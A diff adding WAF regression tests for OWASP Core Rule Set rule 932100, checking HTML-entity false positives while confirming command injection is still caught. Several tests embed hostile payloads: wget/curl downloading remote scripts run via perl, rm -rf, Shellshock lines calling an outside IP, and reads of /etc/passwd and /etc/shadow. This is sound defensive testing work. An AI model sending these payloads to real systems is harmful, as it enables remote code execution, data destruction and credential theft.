@@ -1,0 +1,561 @@
+---
+  meta:
+    author: Piotr Pazola <piotr@webtrip.pl>
+    description: tests for fix of 932100 rule triggered with html decimal entities because of using legacy ISO-8859 charsets family - https://github.com/coreruleset/coreruleset/issues/1886
+    enabled: true
+    name: 932100 html entities iso-8859-x
+  tests:
+  -
+    test_title: True Positive Fix Test 1
+    desc: ISO-8859-2, ISO-8859-3, ISO-8859-4, ISO-8859-5, ISO-8859-6, ISO-8859-7, ISO-8859-8, ISO-8859-10, ISO-8859-14, ISO-8859-15 are affected because the chars are encoded as decimal html %26%238222%3B and %26%238221%3B entities
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=Something+true+positive+%26%238222%3BThe+Title%26%238221%3B.+After+space+or+new+line+more+characters"
+          version: HTTP/1.0
+        output:
+          #status: 200
+          no_log_contains: "id \"932100\""
+  -
+    test_title: True Positive Fix Test 2
+    desc: Like True Positive Fix Test 1 but instead of space sign using new line sign
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.%0D%0AThis+is+the+new+line.+After+it+more+characters%0D%0AAnd+the+3rd+line+goes+here"
+          version: HTTP/1.0
+        output:
+          #status: 200
+          no_log_contains: "id \"932100\""
+  -
+    test_title: True Positive Fix Test 3
+    desc: Another html entity - decimal 9977 (person with ball) with space sign after entity and dot
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=Another+entity+and+the+dot+after+it+and+space+%26%239977%3B.+and+more."
+          version: HTTP/1.0
+        output:
+          #status: 200
+          no_log_contains: "id \"932100\""
+  -
+    test_title: True Positive Fix Test 4
+    desc: Another html entity - decimal 128 (euro) with new line sign after entity and dot
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=Euro+entity+%26%238364%3B.%0D%0Aand+the+new+line+after+entity+and+dot"
+          version: HTTP/1.0
+        output:
+          #status: 200
+          no_log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 1
+    desc: arg value of "ifconfig;. rm -rf /; Something „The Title”. After space or new line more characters" is blocked
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=ifconfig;.+rm+-rf+/;+Something+%26%238222%3BThe+Title%26%238221%3B.+After+space+or+new+line+more+characters"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 2
+    desc: arg value of ";ifconfig Something „The Title”. After space or new line more characters" is blocked
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=;ifconfig+Something+else+1+%26%238222%3BThe+Title%26%238221%3B.+After+space+or+new+line+more+characters"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 3
+    desc: arg value of "Something „The Title”. After ;ifconfig something" is blocked
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=Something+else+2+%26%238222%3BThe+Title%26%238221%3B.+After+%3Bifconfig+something"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 4
+    desc: RCE passed in one of the args
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg1=Something+else+2+%26%238222%3BThe+Title%26%238221%3B.+After+something&arg2=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 5
+    desc: RCE from test 932100.yaml combined with html entities in the middle
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;Something+%26%238222%3BThe+Title%26%238221%3B.+After+something;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 6
+    desc: RCE from test 932100.yaml combined with html entities at the beginning
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 7
+    desc: RCE from test 932100.yaml combined with html entities at the end
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 8
+    desc: RCE from https://github.com/payloadbox/command-injection-payload-list and html entities
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something&arg2=()+{+:;};+/bin/bash+-c+\"sleep+6+&&+echo+vulnerable+6\""
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 9
+    desc: RCE from https://github.com/payloadbox/command-injection-payload-list combined with html entities
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 10
+    desc: RCE from https://github.com/payloadbox/command-injection-payload-list combined with html entities
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=%0Acat%20/etc/passwd;&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 11
+    desc: RCE from https://github.com/payloadbox/command-injection-payload-list combined with html entities
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=()%20{%20:;};%20/bin/bash%20-c%20\"curl%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`uname%20-a\\`\"&arg2=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 12
+    desc: RCE ;ifconfig with html entities two digit decimal of 59 (;)
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=%26%2359%3B+;ifconfig"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 13
+    desc: Like rule True Negative Rule Integrity 9 but the html entity is concatenation with RCE at the end
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 14
+    desc: Like rule True Negative Rule Integrity 9 but the html entity is concatenation with RCE at the beginning
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 15
+    desc: Like rule True Negative Rule Integrity 10 but the html entity is concatenation with RCE at the end
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=%0Acat%20/etc/passwd;+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 16
+    desc: Like rule True Negative Rule Integrity 10 but the html entity is concatenation with RCE at the beginning
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+%0Acat%20/etc/passwd;"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 17
+    desc: Like rule True Negative Rule Integrity 11 but the html entity is concatenation with RCE at the end
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=()%20{%20:;};%20/bin/bash%20-c%20\"curl%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`uname%20-a\\`\"+Something+%26%238222%3BThe+Title%26%238221%3B.+After+something"
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 18
+    desc: Like rule True Negative Rule Integrity 11 but the html entity is concatenation with RCE at the beginning
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something+()%20{%20:;};%20/bin/bash%20-c%20\"curl%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`uname%20-a\\`\""
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 19
+    desc: RCE in arg and html entity is sent in cookie
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+            Cookie: htmlentitycookie=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=()%20{%20:;};%20/bin/bash%20-c%20\"curl%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`uname%20-a\\`\""
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
+  -
+    test_title: True Negative Rule Integrity 20
+    desc: RCE in arg and html entity is sent in cookie
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: ModSecurity CRS 3 Tests
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+            Accept-Encoding: gzip, deflate, br
+            Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+            Content-Type: application/x-www-form-urlencoded
+            Cookie: htmlentitycookie=Something+%26%238222%3BThe+Title%26%238221%3B.+After+something
+          method: POST
+          port: 80
+          uri: "/"
+          data: "arg=()%20{%20:;};%20/bin/bash%20-c%20\"curl%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`uname%20-a\\`\""
+          version: HTTP/1.0
+        output:
+          #status: 403
+          log_contains: "id \"932100\""
